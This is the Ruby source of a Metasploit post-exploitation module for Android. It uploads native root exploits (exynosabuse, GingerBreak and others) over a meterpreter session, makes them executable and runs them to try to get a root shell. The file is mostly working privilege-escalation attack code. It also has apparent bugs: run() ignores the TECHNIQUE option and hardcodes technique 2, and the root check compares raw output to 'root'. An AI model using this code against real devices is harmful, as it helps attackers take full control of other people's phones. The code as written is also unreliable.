##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'metasm'
require 'msf/core/post/windows/priv'


class Metasploit3 < Msf::Post

	include Msf::Post::Common

	def initialize(info={})
		super(update_info(info,
			'Name'          => 'Android Escalate via Native Binary',
			'Description'   => %q{
					This module uses native binaries to attempt to get a root shell
			},
			'License'       => MSF_LICENSE,
			'Author'        => 'timwr',
			'Platform'      => [ 'android' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options([
			OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-4), otherwise try them all", 0])
		], self.class)
		
		@techniques = [ 'su', 'run_root_shell', 'exynosabuse', 'GingerBreak' ]
	end

	def use_technique(tech)
		filename = @techniques[tech]

		print_status("Using technique " + filename)

		if tech == 0
			# su is a special case for rooted devices
			# this may invoke a user prompt from the superuser app
			cmd = "su\n"
		else
			# upload the binary
			localfile = File.join(Msf::Config::InstallRoot, 'data', 'android', filename)
			binary = session.fs.file.new(filename, "wb")
			binary.write(File.read(localfile, {:mode => 'rb'}))
			binary.close()

			# execute the binary
			cmd = "cd /data/data/com.metasploit.stage/files"
			cmd << " && chmod 777 " + filename 
			cmd << " && ./" + filename + "\n"
		end

		# finally, check if we have root
		cmd << "whoami\n"

		# run the commands in a channel
		process = session.sys.process.execute("sh", "", {'Channelized' => true})
		process.channel.write(cmd)
		output = process.channel.read
		if output == 'root'
			print_good("got root")
			return true
		else
			print_error(output)

			# cleanup
			process.channel.close
			process.close
			session.fs.file.delete(filename)
			return false
		end
	end

	def run
		tech = datastore['TECHNIQUE'].to_i
		use_technique(2)
	end

end
